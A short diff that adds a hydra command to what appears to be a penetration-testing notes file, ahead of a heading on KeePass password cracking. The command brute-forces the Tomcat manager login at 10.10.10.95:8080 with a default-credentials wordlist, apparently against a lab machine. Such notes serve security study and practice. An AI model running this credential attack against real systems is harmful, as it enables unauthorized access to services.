@@ -1,3 +1,8 @@
+# hydra
+```bash
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html
+```
+---
 # KeePass Password Cracking
 
 ``` powershell
